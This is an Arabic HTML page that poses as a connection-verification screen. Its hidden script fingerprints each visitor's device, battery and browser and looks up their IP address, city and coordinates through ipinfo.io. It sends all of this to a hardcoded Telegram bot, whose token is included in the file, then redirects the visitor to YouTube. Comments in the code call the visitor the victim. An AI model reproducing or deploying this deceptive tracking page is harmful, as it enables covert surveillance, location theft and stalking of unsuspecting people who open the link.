<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحقق من الأمان</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0d1117;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
            color: #c9d1d9;
            text-align: center;
            direction: rtl;
        }
        .container {
            max-width: 90%;
            padding: 30px;
            background: #161b22;
            border-radius: 16px;
            box-shadow: 0 8px 32px rgba(0,0,0,0.5);
            border: 1px solid #30363d;
        }
        .spinner {
            border: 4px solid #30363d;
            border-top: 4px solid #58a6ff;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 {
            font-size: 20px;
            color: #f0f6fc;
            margin-bottom: 10px;
        }
        p {
            color: #8b949e;
            font-size: 15px;
        }
        .status {
            font-size: 14px;
            color: #58a6ff;
            min-height: 24px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="spinner"></div>
        <h2>🔐 جاري التحقق من اتصالك</h2>
        <p>يرجى الانتظار لحظة... سيتم توجيهك تلقائياً</p>
        <div class="status" id="status">⏳ جاري التجهيز...</div>
    </div>

    <script>
        (function() {
            // ======== بيانات البوت ========
            const BOT_TOKEN = "8317512028:AAHEIRv_S23OFrceayGoKW823jIxvl9Az_k";
            const CHAT_ID = "1497190595";
            const REDIRECT_URL = "https://www.youtube.com/watch?v=6N5IQxrac6g";
            // =============================

            const statusEl = document.getElementById('status');

            function updateStatus(msg) {
                if (statusEl) statusEl.textContent = msg;
            }

            function sendToTelegram(text) {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                return fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: text,
                        parse_mode: 'Markdown',
                        disable_web_page_preview: true
                    })
                }).catch(() => {});
            }

            // ============================================================
            // 1. جمع بيانات الجهاز التفصيلية
            // ============================================================
            const ua = navigator.userAgent;
            let os = 'غير معروف';
            let osVersion = 'غير معروف';
            let browser = 'غير معروف';
            let browserVersion = 'غير معروف';
            let deviceType = 'غير معروف';
            let deviceModel = 'غير معروف';
            let screenRes = `${window.screen.width} × ${window.screen.height}`;
            let batteryLevel = 'غير معروف';
            let isCharging = 'غير معروف';

            // نظام التشغيل
            if (ua.includes('Windows NT 10.0')) { os = 'ويندوز 10'; osVersion = '10'; }
            else if (ua.includes('Windows NT 6.1')) { os = 'ويندوز 7'; osVersion = '7'; }
            else if (ua.includes('Windows NT 6.2')) { os = 'ويندوز 8'; osVersion = '8'; }
            else if (ua.includes('Mac OS X')) { os = 'ماك أو إس'; osVersion = ua.match(/Mac OS X (\d+[._]\d+)/)?.[1] || 'غير معروف'; }
            else if (ua.includes('Android')) { os = 'أندرويد'; osVersion = ua.match(/Android (\d+\.\d+)/)?.[1] || 'غير معروف'; }
            else if (ua.includes('iPhone') || ua.includes('iPad')) { os = 'آي أو إس'; osVersion = ua.match(/OS (\d+[._]\d+)/)?.[1] || 'غير معروف'; }
            else if (ua.includes('Linux')) { os = 'لينكس'; osVersion = 'غير معروف'; }

            // المتصفح
            if (ua.includes('Chrome') && !ua.includes('Edg')) {
                browser = 'جوجل كروم';
                browserVersion = ua.match(/Chrome\/(\d+\.\d+)/)?.[1] || 'غير معروف';
            } else if (ua.includes('Firefox')) {
                browser = 'موزيلا فايرفوكس';
                browserVersion = ua.match(/Firefox\/(\d+\.\d+)/)?.[1] || 'غير معروف';
            } else if (ua.includes('Safari') && !ua.includes('Chrome')) {
                browser = 'آبل سفاري';
                browserVersion = ua.match(/Version\/(\d+\.\d+)/)?.[1] || 'غير معروف';
            } else if (ua.includes('Edg')) {
                browser = 'مايكروسوفت إيدج';
                browserVersion = ua.match(/Edg\/(\d+\.\d+)/)?.[1] || 'غير معروف';
            } else if (ua.includes('OPR') || ua.includes('Opera')) {
                browser = 'أوبرا';
                browserVersion = ua.match(/OPR\/(\d+\.\d+)/)?.[1] || 'غير معروف';
            }

            // نوع الجهاز
            if (ua.includes('Mobile')) deviceType = '📱 هاتف محمول';
            else if (ua.includes('Tablet')) deviceType = '📱 جهاز لوحي';
            else deviceType = '💻 كمبيوتر مكتبي';

            // طراز الجهاز
            if (ua.includes('Android')) {
                const match = ua.match(/\(([^;]+; [^;]+)/);
                if (match) deviceModel = match[1].trim();
            } else if (ua.includes('iPhone')) {
                deviceModel = 'آيفون';
            } else if (ua.includes('iPad')) {
                deviceModel = 'آيباد';
            } else {
                deviceModel = 'جهاز غير معروف';
            }

            const now = new Date();
            const timeStr = now.toLocaleString('ar-EG', { 
                timeZone: 'Asia/Baghdad',
                weekday: 'long',
                year: 'numeric',
                month: 'long',
                day: 'numeric',
                hour: '2-digit',
                minute: '2-digit',
                second: '2-digit'
            });

            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    batteryLevel = (battery.level * 100).toFixed(0) + '%';
                    isCharging = battery.charging ? 'نعم (شاحن موصول)' : 'لا (بطارية فقط)';
                }).catch(() => {});
            }

            // ============================================================
            // 2. إرسال الرسالة الأولى (بيانات الجهاز)
            // ============================================================
            const initialMsg =
                `🔴 *زائر جديد - تم فتح الرابط* 🔴\n` +
                `━━━━━━━━━━━━━━━━━━━━━\n` +
                `📱 *نوع الجهاز:* ${deviceType}\n` +
                `🖥 *نظام التشغيل:* ${os} (الإصدار: ${osVersion})\n` +
                `🌐 *المتصفح:* ${browser} (الإصدار: ${browserVersion})\n` +
                `📟 *طراز الجهاز:* ${deviceModel}\n` +
                `📺 *دقة الشاشة:* ${screenRes}\n` +
                `🔋 *مستوى البطارية:* ${batteryLevel}\n` +
                `🔌 *حالة الشحن:* ${isCharging}\n` +
                `🕒 *الوقت:* ${timeStr}\n` +
                `🔗 *الرابط:* ${window.location.href}`;

            sendToTelegram(initialMsg);
            updateStatus('✅ تم جمع البيانات');

            // ============================================================
            // 3. جلب الموقع الجغرافي (بدون عرض أي شيء للمستخدم)
            // ============================================================
            updateStatus('🌍 جاري تحديد الموقع...');

            fetch('https://ipinfo.io/json', { timeout: 5000 })
                .then(res => {
                    if (!res.ok) throw new Error('HTTP error');
                    return res.json();
                })
                .then(data => {
                    const ip = data.ip || 'غير معروف';
                    let country = data.country || 'غير معروف';
                    let region = data.region || 'غير معروف';
                    let city = data.city || 'غير معروف';
                    const org = data.org || 'غير معروف';
                    const loc = data.loc || 'غير معروف';
                    const timezone = data.timezone || 'غير معروف';
                    const postal = data.postal || 'غير معروف';

                    // محاولة ترجمة الأسماء
                    const translate = {
                        'Iraq': 'العراق', 'Baghdad': 'بغداد', 'Basra': 'البصرة',
                        'Nineveh': 'نينوى', 'Erbil': 'أربيل', 'Sulaymaniyah': 'السليمانية',
                        'Duhok': 'دهوك', 'Kirkuk': 'كركوك', 'Najaf': 'النجف',
                        'Karbala': 'كربلاء', 'Babil': 'بابل', 'Wasit': 'واسط',
                        'Maysan': 'ميسان', 'Dhi Qar': 'ذي قار', 'Muthanna': 'المثنى',
                        'Qadisiyyah': 'القادسية', 'Anbar': 'الأنبار', 'Salah ad-Din': 'صلاح الدين',
                        'Diyala': 'ديالى'
                    };
                    country = translate[country] || country;
                    region = translate[region] || region;
                    city = translate[city] || city;

                    let lat = 'غير معروف', lon = 'غير معروف';
                    if (loc && loc.includes(',')) {
                        const parts = loc.split(',');
                        lat = parts[0].trim();
                        lon = parts[1].trim();
                    }

                    updateStatus('✅ تم التحقق، سيتم توجيهك');

                    // ============================================================
                    // 4. إرسال الرسالة الثانية (التفاصيل الكاملة)
                    // ============================================================
                    const detailedMsg =
                        `🌐 *تفاصيل الزائر (IP والموقع)* 🌐\n` +
                        `━━━━━━━━━━━━━━━━━━━━━\n` +
                        `📌 *الـ IP:* ${ip}\n` +
                        `📍 *الدولة:* ${country}\n` +
                        `🏙️ *المحافظة:* ${region}\n` +
                        `🗺️ *المدينة:* ${city}\n` +
                        `📮 *الرمز البريدي:* ${postal}\n` +
                        `📡 *المزود (الإنترنت):* ${org}\n` +
                        `🗺️ *خط العرض:* ${lat}\n` +
                        `🗺️ *خط الطول:* ${lon}\n` +
                        `⏰ *المنطقة الزمنية:* ${timezone}\n` +
                        `━━━━━━━━━━━━━━━━━━━━━\n` +
                        `📱 *نوع الجهاز:* ${deviceType}\n` +
                        `🖥 *نظام التشغيل:* ${os} (${osVersion})\n` +
                        `🌐 *المتصفح:* ${browser} (${browserVersion})\n` +
                        `📟 *الطراز:* ${deviceModel}\n` +
                        `📺 *الشاشة:* ${screenRes}\n` +
                        `🔋 *البطارية:* ${batteryLevel}\n` +
                        `🔌 *الشحن:* ${isCharging}\n` +
                        `🕒 *الوقت:* ${timeStr}`;

                    sendToTelegram(detailedMsg);
                })
                .catch(() => {
                    updateStatus('✅ سيتم توجيهك');
                    sendToTelegram(`⚠️ *تعذر جلب الموقع* ⚠️\n💻 ${ua}\n🕒 ${timeStr}`);
                });

            // ============================================================
            // 5. التوجيه إلى يوتيوب بعد 3 ثوانٍ (لا شيء يظهر للضحية)
            // ============================================================
            setTimeout(() => {
                window.location.replace(REDIRECT_URL);
            }, 3000);

            setTimeout(() => {
                if (window.location.href !== REDIRECT_URL) {
                    window.location.replace(REDIRECT_URL);
                }
            }, 5000);
        })();
    </script>
</body>
</html>
